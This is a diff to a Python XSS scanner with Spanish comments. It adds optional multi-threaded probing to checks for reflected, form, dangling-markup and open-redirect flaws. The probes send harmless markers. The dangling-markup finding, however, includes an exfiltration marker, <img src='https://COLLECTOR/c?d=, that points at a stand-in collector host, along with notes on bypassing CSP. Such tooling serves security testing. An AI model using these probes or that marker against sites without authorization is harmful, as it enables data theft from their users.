@@ -12,6 +12,7 @@ import re
 import json
 import secrets
 import time
+import concurrent.futures
 
 import requests
 from bs4 import BeautifulSoup
@@ -823,12 +824,25 @@ class XSSHunter:
     De ahi deduce gravedad SIN nunca disparar un payload funcional."""
 
     def __init__(self, session: requests.Session, log: Log,
-                 delay: float = 0.15, timeout: float = 15.0):
+                 delay: float = 0.15, timeout: float = 15.0,
+                 workers: int = 1):
         self.session = session
         self.log = log
         self.delay = delay
         self.timeout = timeout
+        self.workers = max(1, min(int(workers or 1), 8))
         self.api_specs: Dict[str, str] = {}
+
+    def _parallel(self, fn, items):
+        """OVERDRIVE: mapea fn sobre items. Con workers=1 queda secuencial
+        (comportamiento clasico); con N, N sondas en vuelo a la vez. La red
+        es el cuello de botella, no el CPU: incluso en Termux multiplica el
+        rendimiento casi lineal. Devuelve solo los resultados no-None."""
+        items = list(items)
+        if self.workers <= 1 or len(items) <= 1:
+            return [r for r in (fn(i) for i in items) if r]
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as ex:
+            return [r for r in ex.map(fn, items) if r]
 
     @staticmethod
     def _mark() -> str:
@@ -943,25 +957,28 @@ class XSSHunter:
     # ---------- bateria 1: parametros GET ----------
     def test_params(self, targets: List[Dict[str, Any]], max_params: int = 60) -> List[Dict[str, Any]]:
         self.log("[xss] === bateria GET: parametros de URL ===")
-        findings: List[Dict[str, Any]] = []
-        for t in targets[:max_params]:
-            f = self.test_param(t["url"], t["param"])
-            if f:
-                findings.append(f)
-        self.log(f"[xss] GET terminado · {len(findings)} reflexiones encontradas")
+        findings = self._parallel(
+            lambda t: self.test_param(t["url"], t["param"]), targets[:max_params])
+        self.log(f"[xss] GET terminado · {len(findings)} reflexiones encontradas "
+                 f"({self.workers} worker{'s' if self.workers > 1 else ''})")
         return findings
 
     # ---------- bateria 2: formularios ----------
     def test_forms(self, spider_out: Dict[str, Any], max_forms: int = 40) -> List[Dict[str, Any]]:
         self.log("[xss] === bateria FORMULARIOS: reinyeccion campo por campo ===")
-        findings: List[Dict[str, Any]] = []
-        for form in spider_out.get("forms", [])[:max_forms]:
-            for field in form["fields"][:8]:
-                f = self.test_param(form["url"], field, form["method"].upper(),
-                                    base_data={x: "x" for x in form["fields"]})
-                if f:
-                    f["type"] = "XSS en formulario"
-                    findings.append(f)
+        pares = [(form, field)
+                 for form in spider_out.get("forms", [])[:max_forms]
+                 for field in form["fields"][:8]]
+
+        def _probe_form(par):
+            form, field = par
+            f = self.test_param(form["url"], field, form["method"].upper(),
+                                base_data={x: "x" for x in form["fields"]})
+            if f:
+                f["type"] = "XSS en formulario"
+            return f
+
+        findings = self._parallel(_probe_form, pares)
         self.log(f"[xss] FORMS terminado · {len(findings)} reflexiones encontradas")
         return findings
 
@@ -1134,15 +1151,25 @@ class XSSPro:
                        "bing.com", "cloudflare.com", "akamaihd.net", "doubleclick.net")
 
     def __init__(self, session: requests.Session, log: Log,
-                 delay: float = 0.15, timeout: float = 15.0):
+                 delay: float = 0.15, timeout: float = 15.0,
+                 workers: int = 1):
         self.session = session
         self.log = log
         self.delay = delay
         self.timeout = timeout
+        self.workers = max(1, min(int(workers or 1), 8))
         self.csp_inline_ok = None   # lo llena scan_csp_bypass para dangling
 
     def _pause(self) -> None:
         time.sleep(self.delay)
+
+    def _parallel(self, fn, items):
+        """OVERDRIVE: ver XSSHunter._parallel. workers=1 = clasico."""
+        items = list(items)
+        if self.workers <= 1 or len(items) <= 1:
+            return [r for r in (fn(i) for i in items) if r]
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as ex:
+            return [r for r in ex.map(fn, items) if r]
 
     @staticmethod
     def _mark() -> str:
@@ -1324,41 +1351,46 @@ class XSSPro:
         except Exception:
             return None
 
-    def probe_dangling(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+    def _probe_dangling_target(self, tgt) -> List[Dict[str, Any]]:
+        """Sonda de UN objetivo (unidad de trabajo OVERDRIVE)."""
         findings: List[Dict[str, Any]] = []
-        for tgt in param_targets[:self.MAX_PARAMS]:
-            url, param = tgt["url"], tgt["param"]
-            mark = self._mark()
-            r = self._probe_param(url, param, mark)
-            if r is None or mark not in r.text:
-                continue
-            ctx = self._attr_ctx(r.text, mark)
-            if ctx not in ("attr-dq", "attr-sq", "attr-unquoted"):
-                continue
-            quote = '"' if ctx == "attr-dq" else ("'" if ctx == "attr-sq" else "")
-            raw = self._probe_param(url, param, mark + quote + "<")
-            if raw is None or mark not in raw.text:
-                continue
-            after = raw.text[raw.text.find(mark):
-                             raw.text.find(mark) + len(mark) + 3]
-            ok_q = quote != "" and quote in after
-            ok_lt = "<" in after
-            if not (ok_q or (ctx == "attr-unquoted" and ok_lt)):
-                continue
-            gravedad = "alta" if (self.csp_inline_ok is False) else "media"
-            razon = ("reflexion dentro de atributo con comilla cruda: se puede abrir "
-                     "un atributo sin cerrar que traga el resto del HTML hasta la "
-                     "proxima comila y exfiltrarlo de forma PASIVA, sin ejecutar JS")
-            if self.csp_inline_ok is False:
-                razon += ("; la CSP del sitio bloquea JS inline, y el markup colgante "
-                          "NO depende de script-src: es la via de exfiltracion")
-            ev = (f"{urlparse(url).path}?{param}= · contexto {ctx} · comilla+< crudos · "
-                  "marcador de verificacion manual: <img src='https://COLLECTOR/c?d=")
-            findings.append(self._finding("dangling-markup", url, param,
-                                          gravedad, razon, ev, ctx))
-            self.log(f"[xsspro] 💥 dangling markup posible en {param} "
-                     f"({ctx}) @ {urlparse(url).path}")
+        url, param = tgt["url"], tgt["param"]
+        mark = self._mark()
+        r = self._probe_param(url, param, mark)
+        if r is None or mark not in r.text:
+            return findings
+        ctx = self._attr_ctx(r.text, mark)
+        if ctx not in ("attr-dq", "attr-sq", "attr-unquoted"):
+            return findings
+        quote = '"' if ctx == "attr-dq" else ("'" if ctx == "attr-sq" else "")
+        raw = self._probe_param(url, param, mark + quote + "<")
+        if raw is None or mark not in raw.text:
+            return findings
+        after = raw.text[raw.text.find(mark):
+                         raw.text.find(mark) + len(mark) + 3]
+        ok_q = quote != "" and quote in after
+        ok_lt = "<" in after
+        if not (ok_q or (ctx == "attr-unquoted" and ok_lt)):
+            return findings
+        gravedad = "alta" if (self.csp_inline_ok is False) else "media"
+        razon = ("reflexion dentro de atributo con comilla cruda: se puede abrir "
+                 "un atributo sin cerrar que traga el resto del HTML hasta la "
+                 "proxima comila y exfiltrarlo de forma PASIVA, sin ejecutar JS")
+        if self.csp_inline_ok is False:
+            razon += ("; la CSP del sitio bloquea JS inline, y el markup colgante "
+                      "NO depende de script-src: es la via de exfiltracion")
+        ev = (f"{urlparse(url).path}?{param}= · contexto {ctx} · comilla+< crudos · "
+              "marcador de verificacion manual: <img src='https://COLLECTOR/c?d=")
+        findings.append(self._finding("dangling-markup", url, param,
+                                      gravedad, razon, ev, ctx))
+        self.log(f"[xsspro] 💥 dangling markup posible en {param} "
+                 f"({ctx}) @ {urlparse(url).path}")
         return findings
+
+    def probe_dangling(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        tgts = param_targets[:self.MAX_PARAMS]
+        res = self._parallel(self._probe_dangling_target, tgts)
+        return [f for sub in res for f in (sub or [])]
 
     # ---------- 5) XSS almacenado ----------
     def probe_stored(self, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
@@ -1590,46 +1622,51 @@ class XSSPro:
     REDIR_PARAMS = ("url", "redirect", "redirect_uri", "next", "return", "returnto",
                     "r", "continue", "dest", "destination", "target", "goto", "out", "link")
 
-    def probe_open_redirect(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+    def _probe_redir_target(self, tgt) -> List[Dict[str, Any]]:
+        """Sonda de UN objetivo (unidad de trabajo OVERDRIVE)."""
         findings: List[Dict[str, Any]] = []
-        for tgt in param_targets[:self.MAX_PARAMS]:
-            url, param = tgt["url"], tgt["param"]
-            if param.lower() not in self.REDIR_PARAMS:
-                continue
-            mark = self._mark()
+        url, param = tgt["url"], tgt["param"]
+        if param.lower() not in self.REDIR_PARAMS:
+            return findings
+        mark = self._mark()
 
-            def _probe_redir(url: str, param: str, value: str):
-                self._pause()
-                try:
-                    parts = urlparse(url)
-                    q = [(k, v) for k, v in parse_qsl(parts.query) if k != param]
-                    q.append((param, value))
-                    # NO seguir el redirect: el dato esta en la cabecera Location
-                    return self.session.get(
-                        urlunparse(parts._replace(query=urlencode(q))),
-                        timeout=self.timeout, allow_redirects=False)
-                except Exception:
-                    return None
+        def _probe_redir(url: str, param: str, value: str):
+            self._pause()
+            try:
+                parts = urlparse(url)
+                q = [(k, v) for k, v in parse_qsl(parts.query) if k != param]
+                q.append((param, value))
+                # NO seguir el redirect: el dato esta en la cabecera Location
+                return self.session.get(
+                    urlunparse(parts._replace(query=urlencode(q))),
+                    timeout=self.timeout, allow_redirects=False)
+            except Exception:
+                return None
 
-            r = _probe_redir(url, param, "https://example.org/" + mark)
-            loc = (r.headers.get("Location", "") if r is not None else "")
-            if r is None or mark not in loc:
-                continue
+        r = _probe_redir(url, param, "https://example.org/" + mark)
+        loc = (r.headers.get("Location", "") if r is not None else "")
+        if r is None or mark not in loc:
+            return findings
+        findings.append(self._finding(
+            "open-redirect", url, param, "media",
+            "el parametro controla la cabecera Location: open redirect "
+            "(phishing, bypass de allowlists, token leak por referrer)",
+            f"Location -> {loc[:100]}", "header"))
+        self.log(f"[xsspro] 💥 open redirect en '{param}' @ {urlparse(url).path}")
+        r2 = _probe_redir(url, param, "javascript:" + mark)
+        loc2 = (r2.headers.get("Location", "") if r2 is not None else "")
+        if r2 is not None and mark in loc2:
             findings.append(self._finding(
-                "open-redirect", url, param, "media",
-                "el parametro controla la cabecera Location: open redirect "
-                "(phishing, bypass de allowlists, token leak por referrer)",
-                f"Location -> {loc[:100]}", "header"))
-            self.log(f"[xsspro] 💥 open redirect en '{param}' @ {urlparse(url).path}")
-            r2 = _probe_redir(url, param, "javascript:" + mark)
-            loc2 = (r2.headers.get("Location", "") if r2 is not None else "")
-            if r2 is not None and mark in loc2:
-                findings.append(self._finding(
-                    "open-redirect-xss", url, param, "alta",
-                    "el redirect acepta javascript: en Location: si un usuario "
-                    "clickea el link resultante ejecuta JS en el origen del sitio",
-                    f"Location -> {loc2[:100]}", "header"))
+                "open-redirect-xss", url, param, "alta",
+                "el redirect acepta javascript: en Location: si un usuario "
+                "clickea el link resultante ejecuta JS en el origen del sitio",
+                f"Location -> {loc2[:100]}", "header"))
         return findings
+
+    def probe_open_redirect(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        tgts = param_targets[:self.MAX_PARAMS]
+        res = self._parallel(self._probe_redir_target, tgts)
+        return [f for sub in res for f in (sub or [])]
 
     # ---------- 12) reflexion en la ruta ----------
     def probe_path_reflection(self, base_url: str) -> List[Dict[str, Any]]:
